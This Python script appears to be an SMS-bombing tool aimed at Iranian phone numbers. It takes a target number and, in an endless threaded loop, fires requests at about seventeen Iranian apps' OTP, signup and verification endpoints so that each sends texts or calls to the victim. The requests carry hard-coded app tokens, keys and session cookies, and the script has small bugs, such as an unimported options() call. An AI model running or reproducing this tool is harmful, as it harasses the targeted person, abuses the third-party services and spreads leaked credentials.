from platform import node, system, release; Node, System, Release = node(), system(), release() 
from os import system, name; system('clear' if name == 'posix' else 'cls')
from re import match, sub
from threading import Thread, active_count
import urllib3; urllib3.disable_warnings()
from time import sleep
from requests import get, post


def one(phone):
    a = "http://app.insatel.ir/client_webservices.php"
    b = f"ac=10&appname=fk&phonenumber={phone}&token=mw0yDKRVld&serial=null&keyname=verify2"
    d = {"Content-Type": "application/x-www-form-urlencoded","Content-Length": "85","Host": "app.insatel.ir","Connection": "Keep-Alive","Accept-Encoding": "gzip","User-Agent": "okhttp/3.12.1"}
    try:
        r = post(a, data=b, headers=d)
    except:
        cr = "ThePurea"


def two(phone):
    a = "http://setmester.com/mrfallowtel_glp/client_webservices4.php"
    b = f"ac=9&username=gyjoo8uyt&password=123456&fullname=hkurdds6&phonenumber={phone}&token=1uhljuqBpI&serial=null"
    d = {"Content-Type": "application/x-www-form-urlencoded","Content-Length": "110","Host": "setmester.com","Connection": "Keep-Alive","Accept-Encoding": "gzip","User-Agent": "okhttp/3.12.1"}
    try:
        r = post(a, data=b, headers=d)
    except:
        cr = "ThePurea"


def tree(phone):
    a = "http://jozamoza.com/com.cyberspaceservices.yb/client_webservices4.php"
    b = f"ac=9&username=sjwo7ehd&password=123456&fullname=dheoe9dy&phonenumber={phone}&token=qqcI33qkGC&serial=null"
    d = {"Content-Type": "application/x-www-form-urlencoded","Content-Length": "109","Host": "jozamoza.com","Connection": "Keep-Alive","Accept-Encoding": "gzip","User-Agent": "okhttp/3.12.1"}
    try:
        r = post(a, data=b, headers=d)
    except:
        cr = "ThePurea"


def fwor(phone):
    a = "https://api.nazdika.com/v3/account/request-login/"
    b = f"phone={phone}"
    d = {"Accept": "Application/JSON","User-Agent": ",29;Xiaomi M90077J70CG;LTE","X-ODD-User-Agent": "Mozilla/9.0 (Linux; Android 10; M9007J540CG Build/QKQ1.97512.002; wv) AppleWebKit/9977.36 (KHTML, like Gecko) Version/4.0 Chrome/2000.0.4896.127 Mobile Safari/999.36","X-ODD-Operator": "IR-MCI,IR-MCI","X-ODD-SOURCE": "Nazdika-v-1140","X-ODD-MARKET": "googlePlay","X-ODD-IDENTIFIER": "null","X-ODD-ANDROID-ID": "lllllllllllll666llllllllll","Content-Type": "application/x-www-form-urlencoded","Content-Length": "17","Host": "api.nazdika.com","Connection": "Keep-Alive","Accept-Encoding": "gzip"}
    try:
        r = post(a, data=b, headers=d)
    except:
        cr = "ThePurea"


def five(phone):
    a = "http://followmember2022.ir/followmember/client_webservices4.php"
    b = f"ac=10&phonenumber={phone}&token=CLTRIcCmcT&serial=null"
    d = {"Content-Type": "application/x-www-form-urlencoded","Content-Length": "58","Host": "followmember2022.ir","Connection": "Keep-Alive","Accept-Encoding": "gzip","User-Agent": "okhttp/3.12.1"}
    try:
        r = post(a, data=b, headers=d)
    except:
        cr = "ThePurea"


def six(phone):
    a = "https://iranstor1.ir/index.php/api/login?sms.ir"
    b = f"fullname=alimahmoodiu&mobile={phone}&device_id=12365478911&token=c5aef1158542ea0932c1916f829d943c"
    d = {"Host": "iranstor1.ir","key": "d41d8cd98f00b204e9800998ecf8427e","apptoken": "VdOIvN6tHdgjNrmCr0PvSg==:NTU1ZDBhNGNiODY0NzgyNA==","content-type": "application/x-www-form-urlencoded","content-length": "115","accept-encoding": "gzip","cookie": "ci_session=181bfd8fd175d83b156a57e477afc7edbc703522","user-agent": "okhttp/3.5.0"}
    try:
        r = post(a, data=b, headers=d)
    except:
        cr = "ThePurea"


def seven(phone):
    a = "https://homa.petabad.com/customer/signup"
    b = f"my_server_api_version=1&platform=android&my_app_type=android&my_app_version=17&time_zone_offset=270&app_name=customer&phone_number={phone}"
    d = {"user-agent": "Dart/2.14 (dart:io)","content-type": "application/x-www-form-urlencoded; charset=utf-8","accept-encoding": "gzip","content-length": "142","host": "homa.petabad.com"}
    try:
        r = post(a, data=b, headers=d)
    except:
        cr = "ThePurea"


def eyit(phone):
    a = "https://takhfifan.com/api/jsonrpc/1_0/"
    b = {"id":592419288011976410,"method":"customerExistOtp","params":["023804109885a10d02158eef65c5d887",{"username":phone}]}
    d = {"Host": "takhfifan.com","x-session": "023804109885a10d02158eef65c5d887","content-type": "takhfifanApp/json","content-length": "126","accept-encoding": "gzip","user-agent": "okhttp/3.14.9"}
    try: 
        r = post(a, json=b, headers=d)
    except:
        cr = "ThePurea"


def niyne(phone):
    a = "http://baharapp.xyz/api/v1.1/reqSMS.php"
    b = f"phone={phone}&"
    d = {"Content-Type": "application/x-www-form-urlencoded","User-Agent": "Dalvik/2.1.0 (Linux; U; Android 100; M2007J208CG MIUI/V12.0.9.0.QJGMIXM)","Host": "baharapp.xyz","Connection": "Keep-Alive","Accept-Encoding": "gzip","Content-Length": "18"}
    try:
        r = post(a, data=b, headers=d)
    except:
        cr = "ThePurea"


def ten(phone):
    a = "http://serverpv1.xyz/api/v1/reqSMS"
    b = f"phone={phone}&"
    d = {"Content-Type": "application/x-www-form-urlencoded","User-Agent": "Dalvik/2.1.0 (Linux; U; Android 100; M2007J208CG MIUI/V12.0.9.0.QJGMIXM)","Host": "serverpv1.xyz","Connection": "Keep-Alive","Accept-Encoding": "gzip","Content-Length": "18"}
    try:
        r = post(a, data=b, headers=d)
    except:
        cr = "ThePurea"


def eleven(phone):
    a = "http://kolbeapp.xyz/api/v1/reqSMS"
    b = f"phone={phone}&"
    d = {"Content-Type": "application/x-www-form-urlencoded","User-Agent": "Dalvik/2.1.0 (Linux; U; Android 100; M2007J208CG MIUI/V12.0.9.0.QJGMIXM)","Host": "kolbeapp.xyz","Connection": "Keep-Alive","Accept-Encoding": "gzip","Content-Length": "18"}
    try:
        r = post(a, data=b, headers=d)
    except:
        cr = "ThePurea"


def tovelf(phone):
    a = "http://arezooapp.xyz/api/v1/reqSMS"
    b = f"phone={phone}&"
    d = {"Content-Type": "application/x-www-form-urlencoded","User-Agent": "Dalvik/2.1.0 (Linux; U; Android 100; M2007J208CG MIUI/V12.0.9.0.QJGMIXM)","Host": "arezooapp.xyz","Connection": "Keep-Alive","Accept-Encoding": "gzip","Content-Length": "18"}
    try:
        r = post(a, data=b, headers=d)
    except:
        cr = "ThePurea"


def therty(phone):
    a = "http://servermv1.xyz/api/v1/reqSMS"
    b = f"phone={phone}&"
    d = {"Content-Type": "application/x-www-form-urlencoded","User-Agent": "Dalvik/2.1.0 (Linux; U; Android 100; M2007J208CG MIUI/V12.0.9.0.QJGMIXM)","Host": "servermv1.xyz","Connection": "Keep-Alive","Accept-Encoding": "gzip","Content-Length": "18"}
    try:
        r = post(a, data=b, headers=d)
    except:
        cr = "ThePurea"


def forty(phone):
    a = "https://core.otaghak.com/odata/Otaghak/Users/ReadyForLogin"
    b = {"userName":phone}
    d = {"Host": "core.otaghak.com","app-version": "235","app-version-name": "5.12.0","app-client": "guest","device-model": "POCO M2007J20CG","device-sdk": "29","user-agent": "app:5.12.0(235)@POCO M2007J20CG","content-type": "application/json; charset=UTF-8","content-length": "26","accept-encoding": "gzip"}
    try:
        r = post(a, json=b, headers=d)
    except:
        cr = "ThePurea"


def fifty(phone):
    a = "https://gharar.ir/api/v1/users/"
    b = {"phone":phone}
    d = {"Host": "gharar.ir","appversion": "1.5.4","content-type": "application/json; charset=UTF-8","content-length": "23","accept-encoding": "gzip","user-agent": "okhttp/4.9.2"}
    try:
        r = post(a, json=b, headers=d)
    except:
        cr = "ThePurea"


def sixty(phone):
    a = "http://serverhv1.xyz/api/v1.1/reqSMS.php"
    b = f"phone={phone}&"
    d = {"Content-Type": "application/x-www-form-urlencoded","User-Agent": "Dalvik/2.1.0 (Linux; U; Android 100; M2007J208CG MIUI/V12.0.9.0.QJGMIXM)","Host": "serverhv1.xyz","Connection": "Keep-Alive","Accept-Encoding": "gzip","Content-Length": "18"}
    try:
        r = post(a, data=b, headers=d)
    except:
        cr = "ThePurea"


def sventtubf(phone):
    get(f"https://cyclops.drnext.ir/v1/doctors/auth/check-doctor-exists-by-mobile?mobile={phone}", headers={"Host": "cyclops.drnext.ir","accept-language": "fa","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (Linux; Android 10; M2007J20CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","origin": "https://panel.drnext.ir","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://panel.drnext.ir/","accept-encoding": "gzip, deflate, br"})
    options("https://cyclops.drnext.ir/v1/doctors/auth/send-verification-token", headers={"Host": "cyclops.drnext.ir","accept": "*/*","access-control-request-method": "POST","access-control-request-headers": "content-type","origin": "https://panel.drnext.ir","user-agent": "Mozilla/5.0 (Linux; Android 10; M2007J20CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","sec-fetch-mode": "cors","sec-fetch-site": "same-site","sec-fetch-dest": "empty","referer": "https://panel.drnext.ir/","accept-encoding": "gzip, deflate, br","accept-language": "en-GB,en-US;q=0.9,en;q=0.8,fa;q=0.7"})
    post("https://cyclops.drnext.ir/v1/doctors/auth/send-verification-token", json={"mobile":phone}, headers={"Host": "cyclops.drnext.ir","content-length": "24","accept": "application/json, text/plain, */*","accept-language": "fa","user-agent": "Mozilla/5.0 (Linux; Android 10; M2007J20CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8","origin": "https://panel.drnext.ir","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://panel.drnext.ir/","accept-encoding": ",gzip, deflate, br"})
    options("https://cyclops.drnext.ir/v1/doctors/auth/call-verification-token", headers={"Host": "cyclops.drnext.ir","accept": "*/*","access-control-request-method": "POST","access-control-request-headers": "content-type","origin": "https://panel.drnext.ir","user-agent": "Mozilla/5.0 (Linux; Android 10; M2007J20CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","sec-fetch-mode": "cors","sec-fetch-site": "same-site","sec-fetch-dest": "empty","referer": "https://panel.drnext.ir/","accept-encoding": "gzip, deflate, br","accept-language": "en-GB,en-US;q=0.9,en;q=0.8,fa;q=0.7"})
    post("https://cyclops.drnext.ir/v1/doctors/auth/call-verification-token", json={"mobile":phone}, headers={"Host": "cyclops.drnext.ir","content-length": "24","accept": "application/json, text/plain, */*","accept-language": "fa","user-agent": "Mozilla/5.0 (Linux; Android 10; M2007J20CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8","origin": "https://panel.drnext.ir","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://panel.drnext.ir/","accept-encoding": "gzip, deflate, br"})

def is_phone(phone: str):
    phone = sub("\s+", "" ,phone.strip())
    if match(r"^\+989[0-9]{9}$", phone):
        return phone
    elif match(r"^989[0-9]{9}$", phone):
        return f"+{phone}"
    elif match(r"^09[0-9]{9}$", phone):
        return f"+98{phone[1::]}"
    elif match(r"^9[0-9]{9}$", phone):
        return f"+98{phone}"
    else:
        return False

r='\033[1;31m'
g='\033[32;1m' 
y='\033[1;33m'
w='\033[1;37m'

def Vip(phone, tedad):
        for kos in range(int(tedad)):
            Thread(target=sventtubf, args=[phone]).start()
            Thread(target=one, args=[phone]).start()
            Thread(target=two, args=[phone]).start()
            Thread(target=tree, args=[phone]).start()
            Thread(target=fwor, args=[phone]).start()
            Thread(target=five, args=[phone]).start()
            Thread(target=six, args=[phone]).start()
            Thread(target=seven, args=[phone]).start()
            Thread(target=eyit, args=[phone]).start()
            Thread(target=niyne, args=[phone]).start()
            Thread(target=ten, args=[phone]).start()
            Thread(target=eleven, args=[phone]).start()
            Thread(target=tovelf, args=[phone]).start()
            Thread(target=therty, args=[phone]).start()
            Thread(target=forty, args=[phone]).start()
            Thread(target=fifty, args=[phone]).start()
            Thread(target=sixty, args=[phone]).start()
while True:
    phone = is_phone(input(f'{g}[?] {w}Enter Phone Number {g}(+98) {r}- {w}'))
    if phone:
        break
try:
    tedad = float(input(f'{g}[?] {y}Enter Sleep Time Between Requests {g}[Defult=0.1] {r}- {w}'))
except ValueError:
    tedad = 10
    print(f"{g}[0.1] {w}Used")
while True:
    try: Vip(phone, tedad)
    except KeyboardInterrupt: exit(f'{r}[-] User Exited')
    except: print(f'{r}[-] Error TimeOut')